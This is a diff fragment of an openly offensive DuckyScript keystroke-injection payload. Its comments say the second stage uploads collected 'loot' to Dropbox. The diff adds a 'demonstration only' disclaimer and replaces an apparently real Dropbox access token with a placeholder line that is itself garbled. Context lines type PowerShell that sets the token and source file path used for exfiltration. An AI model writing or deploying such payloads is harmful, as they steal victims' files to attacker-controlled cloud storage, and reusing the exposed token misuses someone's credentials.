@@ -18,6 +18,7 @@ REM In the Second stage the loot is uploaded via dropbox.
 
 REM Check out I am Jakoby on Youtube to set up your DropBox for uploads.
 
+REM THIS PAYLOAD IS FOR DEMONSTRATION PURPOSES ONLY, AND NOT INTENDED FOR MISUSE!
 
 REM Stage 1
 
@@ -145,10 +146,10 @@ ENTER
 STRING ) 
 DELAY 500
 ENTER
-STRING $DropBoxAccessToken = "sl.BJw6iDRg9VQzRahBrWMYoGl_M-pZC5syl43L5ejRvMp4gAS_oshbTjLjC3tsmh3N3ez5OukgVfdRfGA-OGubP9zW1fUApRCvYolF0f_QseB233lZJBwOOiLfQ3EbnwvL08xfNgk9
+STRING $DropBoxAccessToken = "$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN-HERE
 DELAY 500
 ENTER
-STRING "   # Replace with your DropBox Access Token
+STRING "   
 DELAY 500
 ENTER
 STRING $outputFile = Split-Path $SourceFilePath -leaf
